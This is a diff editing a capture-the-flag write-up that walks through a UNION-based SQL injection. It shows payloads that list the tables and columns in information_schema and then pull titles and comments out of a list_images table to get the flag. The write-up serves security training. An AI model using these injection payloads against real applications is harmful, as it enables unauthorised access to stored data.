@@ -10,33 +10,35 @@ SELECT firts_name, last_name FROM users WHERE user_id = 1;
 
 Now we know that we've got some table in a database that contains at least 3 pieces of information related to a member: an ID (the value we type), a title, and a Url.
 
-2. The next step is to find the name of the table (or tables) in presented database using the UNION injection, as it was in the previous exercise.
+2. The next step is to find the name of the table (or tables) in the presented database using a UNION injection, just like in the previous exercise.
 
 1 UNION
 SELECT column_name, table_name
 FROM information_schema.columns;
 
-Among the default tables we can find our whith columns that corresponds our output:
+Among the default tables we can find one whose columns match the output we see on the page:
 
     - list_images (it contains 'url' and 'title')
 
-    ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
-    Title: list_images
-    Url : id
+The UNION output shows
 
-    ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
-    Title: list_images
-    Url : url
+ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
+Title: list_images
+Url : id
 
-    ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
-    Title: list_images
-    Url : title
+ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
+Title: list_images
+Url : url
 
-    ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
-    Title: list_images
-    Url : comment
+ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
+Title: list_images
+Url : title
 
-4. Then we select the columns that contains titles and commentaries, and finally get our flag:
+ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
+Title: list_images
+Url : comment
+
+4. Then we select the columns that contain titles and commentaries, and finally get our flag:
 
 1 UNION SELECT title, comment FROM list_images;
 
